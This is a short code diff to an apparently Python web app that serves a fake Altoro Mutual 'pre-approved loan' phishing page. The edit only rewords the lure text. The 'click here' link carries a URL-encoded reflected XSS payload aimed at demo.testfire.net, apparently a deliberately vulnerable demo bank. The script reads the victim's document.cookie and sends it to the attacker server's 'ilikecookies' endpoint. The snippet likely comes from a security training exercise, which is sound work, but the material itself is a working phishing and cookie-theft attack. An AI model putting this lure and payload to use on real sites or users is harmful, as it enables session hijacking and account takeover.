@@ -58,7 +58,7 @@ def loanapproval():
             <h1>You are granted loan by Altoro mutual</h1> 
             <p> 
                 Your account has been granted an pre approved loan.
-                Please to continue further.<a href="http://demo.testfire.net/search.jsp?query=%3Cscript%3Evar+xsession%3D%22''' + request.url_root + '''ilikecookies%3F%22.concat%28document.cookie%29%3B+var+xhttp+%3D+new+XMLHttpRequest%28%29%3B+xhttp.open%28%22GET%22%2C+xsession%2C+true%29%3B+xhttp.send%28%29%3C%2Fscript%3E">click here</a>
+                To continue further, please<a href="http://demo.testfire.net/search.jsp?query=%3Cscript%3Evar+xsession%3D%22''' + request.url_root + '''ilikecookies%3F%22.concat%28document.cookie%29%3B+var+xhttp+%3D+new+XMLHttpRequest%28%29%3B+xhttp.open%28%22GET%22%2C+xsession%2C+true%29%3B+xhttp.send%28%29%3C%2Fscript%3E">click here.</a>
             </p> 
         </center> 
     </body> 
